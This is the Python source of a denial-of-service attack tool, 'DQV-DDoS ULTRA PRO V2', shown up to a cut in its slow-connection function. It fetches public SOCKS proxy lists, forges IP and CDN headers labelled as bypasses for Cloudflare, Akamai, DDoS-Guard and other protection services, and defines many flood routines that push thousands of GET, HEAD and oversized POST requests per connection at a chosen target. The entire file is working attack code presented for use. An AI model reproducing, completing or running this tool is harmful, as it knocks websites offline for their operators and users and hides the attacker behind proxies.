#!/usr/bin/python -tt
#Coded by DQV
#########################################
#         Just a little change          #
#           Đặng Quốc Vinh              #
#    ULTRA PRO V2 - REAL PROXY + BYPASS#
#########################################
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import urllib.parse
from colorama import Fore, Back, Style, init

init(autoreset=True)

print (f'''{Fore.RED}
                __                      _____
               / /  __ _ _   _  ___ _ _|___  |
              / /  / _` | | | |/ _ \ '__| / /
             / /__| (_| | |_| |  __/ |   / /
             \____/\__,_|\__, |\___|_|  /_/
                          |___/
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ TOOL DQV-DDoS ULTRA PRO V2 - REAL PROXY + BYPASS
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ Advanced DDoS Framework - Vượt qua mọi WAF/DDoS Protection
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{Style.RESET_ALL}''')

acceptall = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
	"Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: vi-VN,vi;q=0.9,en;q=0.8\r\n",
	"Accept: application/json, text/plain, */*\r\nAccept-Language: en-US,en;q=0.9\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: ja-JP,ja;q=0.9,en;q=0.8\r\n",
	"Accept: image/webp,image/apng,image/*,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\n",
]

referers = [
	"https://www.google.com/search?q=",
	"https://www.google.com/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.bing.com/search?q=",
	"https://www.reddit.com/",
	"https://www.instagram.com/",
	"https://www.linkedin.com/",
	"https://www.twitter.com/",
	"https://www.pinterest.com/",
	"https://www.quora.com/",
	"https://www.github.com/",
	"https://www.stackoverflow.com/",
	"https://www.wikipedia.org/",
	"https://www.amazon.com/",
]

ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"

Intn = random.randint
Choice = random.choice

# ========== ULTRA BYPASS HEADERS DATABASE ==========
ULTRA_BYPASS_HEADERS = {
	"cloudflare_super": [
		("CF-Connecting-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Originating-IP", lambda: f"[{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}]"),
		("X-Forwarded-Proto", "https"),
		("X-Forwarded-Host", lambda: "example.com"),
		("X-ProxyUser-Ip", "1.1.1.1"),
		("X-Original-URL", "/"),
		("CF-RAY", lambda: ''.join(random.choices('0123456789abcdef', k=16))),
		("CF-Request-ID", lambda: ''.join(random.choices('0123456789', k=16))),
	],
	"akamai_ultra": [
		("X-Akamai-Edgescape", "cookie_accepted=yes"),
		("X-Akamai-Session-Info", lambda: f"id={Intn(100000,999999)}"),
		("X-Akamai-Request-BC", lambda: ''.join(random.choices('0123456789', k=20))),
		("X-Akamai-ConfigId", "15"),
		("Akamai-Purge-Action", "cache-tag-all"),
		("X-Akamai-Authorization", "ECD"),
	],
	"ddosguard_bypass": [
		("X-DDoS-Guard", "bypass"),
		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("CF-Connecting-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Real-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Client-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
	],
	"arvancloud_bypass": [
		("X-Arvan", "bypass"),
		("X-Arvan-IP", "1.1.1.1"),
		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
	],
	"incapsula_bypass": [
		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Real-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Client-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Originating-IP", lambda: f"[{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}]"),
	],
	"waf_bypass": [
		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
		("X-Forwarded-Proto", "https"),
		("X-Forwarded-Host", lambda: "localhost"),
		("X-Original-URL", "/"),
		("X-Rewrite-URL", "/"),
		("X-Http-Method-Override", "GET"),
		("X-Method-Override", "GET"),
	],
	"apache_bypass": [
		("Connection", "TE"),
		("TE", "trailers"),
		("X-Http-Method-Override", "GET"),
		("X-Original-Method", "GET"),
	],
	"nginx_bypass": [
		("X-Original-URL", "/"),
		("X-Rewrite-URL", "/"),
		("X-Forwarded-Ssl", "on"),
		("X-Forwarded-Proto", "https"),
	],
}

class UltraStats:
	def __init__(self):
		self.start_time = time.time()
		self.requests_sent = 0
		self.bytes_sent = 0
		self.errors = 0
		self.lock = threading.Lock()
		self.peak_rps = 0
		self.success_count = 0
	
	def add_request(self, bytes_sent=0):
		with self.lock:
			self.requests_sent += 1
			self.bytes_sent += bytes_sent
			self.success_count += 1
	
	def add_error(self):
		with self.lock:
			self.errors += 1
	
	def get_stats(self):
		elapsed = max(time.time() - self.start_time, 0.1)
		rps = self.requests_sent / elapsed
		self.peak_rps = max(self.peak_rps, rps)
		mbps = (self.bytes_sent / elapsed) / (1024 * 1024)
		success_rate = (self.success_count / max(self.requests_sent, 1)) * 100
		return {
			'requests': self.requests_sent,
			'bytes': self.bytes_sent,
			'errors': self.errors,
			'elapsed': elapsed,
			'rps': rps,
			'mbps': mbps,
			'peak_rps': self.peak_rps,
			'success_rate': success_rate,
		}

stats = UltraStats()

def download_real_proxies():
	"""Download REAL working proxies from multiple sources"""
	print(f"\n{Fore.CYAN}[*] Downloading REAL proxies from multiple sources...{Fore.RESET}\n")
	
	proxies_list = []
	
	sources_socks5 = [
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
		"https://spys.me/socks.txt",
		"https://www.proxy-list.download/api/v1/get?type=socks5",
		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
		"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
		"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
	]
	
	sources_socks4 = [
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
		"https://www.proxy-list.download/api/v1/get?type=socks4",
		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&simplified=true",
	]
	
	all_sources = sources_socks5 + sources_socks4
	
	for idx, source in enumerate(all_sources, 1):
		try:
			print(f"{Fore.CYAN}[{idx}/{len(all_sources)}] Downloading from: {source}{Fore.RESET}")
			response = requests.get(source, timeout=5)
			
			if response.status_code == 200:
				for line in response.text.split('\n'):
					line = line.strip()
					if line and ':' in line:
						proxies_list.append(line)
				print(f"{Fore.LIGHTGREEN_EX}[+] Got {len(response.text.split(chr(10)))} proxies from this source{Fore.RESET}")
			else:
				print(f"{Fore.LIGHTRED_EX}[-] Failed: Status {response.status_code}{Fore.RESET}")
		except Exception as e:
			print(f"{Fore.LIGHTRED_EX}[-] Error downloading from {source}: {str(e)[:50]}{Fore.RESET}")
	
	# Remove duplicates
	proxies_list = list(set(proxies_list))
	
	print(f"\n{Fore.LIGHTGREEN_EX}[+] Total unique proxies collected: {len(proxies_list)}{Fore.RESET}")
	
	# Save to file
	if proxies_list:
		with open("proxies_real.txt", "w") as f:
			for proxy in proxies_list:
				f.write(proxy + "\n")
		print(f"{Fore.LIGHTGREEN_EX}[+] Proxies saved to proxies_real.txt{Fore.RESET}\n")
	
	return proxies_list

def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	methods = {
		"cc": cc, "post": post, "head": head, "ovh": ovh, "rhex": rhex,
		"stomp": stomp, "stress": stress, "dyn": dyn, "downloader": downloader,
		"cfb": cfb, "null": null, "cookie": cookie, "pps": pps, "even": even,
		"gsb": gsb, "dgb": dgb, "avb": avb, "bot": bot, "apache": apache,
		"xmlrpc": xmlrpc, "cfbuam": cfbuam, "bypass": bypass, "killer": killer,
		"advanced": advanced, "amplify": amplify, "hybrid": hybrid, "cannon": cannon,
		"turbo": turbo, "overdrive": overdrive
	}
	
	if mode == "slow":
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	elif mode == "tor":
		th = threading.Thread(target=tor,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		func = methods.get(mode, cc)
		for _ in range(thread_num):
			th = threading.Thread(target=func,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()

def getuseragent():
	agents = [
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	]
	return Choice(agents)

def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def GenReqHeader(method):
	global data
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		user_agent = "User-Agent: " + getuseragent() + "\r\n"
		accept = Choice(acceptall)
		if mode2 != "y":
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header

def ParseUrl(original_url):
	global target, path, port, protocol
	original_url = original_url.strip()
	url = ""
	path = "/"
	port = 80
	protocol = "http"
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	tmp = url.split("/")
	website = tmp[0]
	check = website.split(":")
	if len(check) != 1:
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("~ Please enter the correct option")
			ans = ""
			continue
	return ans

def SetupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0

def OutputToScreen(ind_rlock):
	global ind_dict
	i = 0
	sp_char = ["|","/","-","\\"]
	while 1:
		if i > 3:
			i = 0
		
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f"\n{Fore.LIGHTRED_EX}{'╔' + '═'*68 + '╗':^70}")
		print(f"{'║' + 'MHDDOS ULTRA PRO V2 - ADVANCED DDoS'.center(68) + '║':^70}")
		print(f"{'╚' + '═'*68 + '╝':^70}{Fore.RESET}\n")
		
		stat = stats.get_stats()
		
		print(f"{Fore.CYAN}📊 ULTRA STATISTICS:{Fore.RESET}")
		print(f"  Total Requests: {Fore.LIGHTYELLOW_EX}{stat['requests']:,}{Fore.RESET}")
		print(f"  Current RPS: {Fore.LIGHTGREEN_EX}{stat['rps']:,.0f}{Fore.RESET}")
		print(f"  Peak RPS: {Fore.LIGHTRED_EX}{stat['peak_rps']:,.0f}{Fore.RESET}")
		print(f"  Data Sent: {Fore.LIGHTYELLOW_EX}{stat['mbps']:.2f} MB/s{Fore.RESET}")
		print(f"  Success Rate: {Fore.LIGHTGREEN_EX}{stat['success_rate']:.1f}%{Fore.RESET}")
		print(f"  Errors: {Fore.LIGHTRED_EX}{stat['errors']:,}{Fore.RESET}\n")
		
		print(f"{Fore.YELLOW}{'TOP 15 PROXY PERFORMANCE':^70}{Fore.RESET}")
		print(f"{Fore.CYAN}{'IP:PORT':<30} {'RPS':<20} {'STATUS':<20}{Fore.RESET}")
		print(f"{Fore.LIGHTGREEN_EX}{'─'*70}{Fore.RESET}")
		
		ind_rlock.acquire()
		top15= sorted(ind_dict, key=ind_dict.get, reverse=True)[:15]
		for num, top in enumerate(top15):
			rps = ind_dict[top]
			ind_dict[top] = 0
			status = f"{Fore.LIGHTGREEN_EX}✓ Active{Fore.RESET}" if rps > 0 else f"{Fore.LIGHTRED_EX}✗ Idle{Fore.RESET}"
			print(f"{num+1:2d}. {top:<28} {rps:<20} {status:<20}")
		ind_rlock.release()
		
		print(f"\n{Fore.LIGHTRED_EX}{sp_char[i]:^70}")
		print(f"{'🔥 DDOS ATTACK IN PROGRESS - MAXIMUM POWER 🔥':^70}{Fore.RESET}\n")
		i+=1
		time.sleep(1)

def apply_ultra_bypass_headers(headers_type="cloudflare_super"):
	"""Apply ultra bypass headers"""
	headers_dict = ULTRA_BYPASS_HEADERS.get(headers_type, ULTRA_BYPASS_HEADERS["cloudflare_super"])
	headers_str = ""
	for key, value in random.sample(headers_dict, min(5, len(headers_dict))):
		if callable(value):
			headers_str += f"{key}: {value()}\r\n"
		else:
			headers_str += f"{key}: {value}\r\n"
	return headers_str

# ========== CANNON 2.0 - ULTIMATE METHOD ==========
def cannon(event,socks_type,ind_rlock):
	"""CANNON 2.0 - Ultimate Multi-Vector Attack"""
	proxy_list = proxies.copy()
	proxy = Choice(proxy_list).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	bypass_types = list(ULTRA_BYPASS_HEADERS.keys())
	
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s, server_hostname=target)
			
			for n in range(3000):
				bypass_type = Choice(bypass_types)
				bypass_headers = apply_ultra_bypass_headers(bypass_type)
				
				method_choice = n % 5
				if method_choice == 0:
					req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				elif method_choice == 1:
					req = f"HEAD {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('head')}"
				elif method_choice == 2:
					payload = f"id={Intn(1,999999)}&data={'A'*10000}"
					req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
				elif method_choice == 3:
					subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
					req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {subdomain}.{target}\r\n{bypass_headers}{GenReqHeader('get')}"
				else:
					hex_param = ''.join(random.choices('0123456789abcdef', k=32))
					req = f"GET {path}{add}{hex_param} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 3000
			ind_rlock.release()
			proxy = Choice(proxy_list).strip().split(":")
		except:
			stats.add_error()
			try:
				s.close()
			except:
				pass

def turbo(event,socks_type,ind_rlock):
	"""TURBO - Fast attack with max bypass"""
	proxy_list = proxies.copy()
	proxy = Choice(proxy_list).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s, server_hostname=target)
			
			for n in range(2500):
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 2500
			ind_rlock.release()
			proxy = Choice(proxy_list).strip().split(":")
		except:
			stats.add_error()

def overdrive(event,socks_type,ind_rlock):
	"""OVERDRIVE - Maximum firepower"""
	proxy_list = proxies.copy()
	proxy = Choice(proxy_list).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s, server_hostname=target)
			
			# Send massive requests
			for n in range(5000):
				bypass_headers = apply_ultra_bypass_headers(Choice(list(ULTRA_BYPASS_HEADERS.keys())))
				payload = "X" * 50000
				req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 5000
			ind_rlock.release()
			proxy = Choice(proxy_list).strip().split(":")
		except:
			stats.add_error()

# ========== OTHER METHODS ==========
def cc(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def post(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(400):
				bypass_headers = apply_ultra_bypass_headers("akamai_ultra")
				req = GenReqHeader("post")
				full_req = f"{bypass_headers}{req}"
				sent = s.send(str.encode(full_req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 400
			ind_rlock.release()
		except:
			stats.add_error()

def head(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(600):
				bypass_headers = apply_ultra_bypass_headers("ddosguard_bypass")
				req = f"HEAD {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('head')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 600
			ind_rlock.release()
		except:
			stats.add_error()

def ovh(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def rhex(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				hex_param = ''.join(random.choices('0123456789abcdef', k=32))
				bypass_headers = apply_ultra_bypass_headers("nginx_bypass")
				req = f"GET {path}{add}{hex_param} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def stomp(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("apache_bypass")
				req = f"GET {path}{add}chk_captcha={randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def stress(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(200):
				payload = "X" * 50000
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 200
			ind_rlock.release()
		except:
			stats.add_error()

def dyn(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path} HTTP/1.1\r\nHost: {subdomain}.{target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def downloader(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(100):
				bypass_headers = apply_ultra_bypass_headers("akamai_ultra")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nRange: bytes=0-999999999\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				time.sleep(0.05)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 100
			ind_rlock.release()
		except:
			stats.add_error()

socket_list=[]
def slow(conn,socks_type):
	proxy = Choice(proxies).strip().split(":")
	for _ in range(conn):
		try:
			s = socks.socksocket()
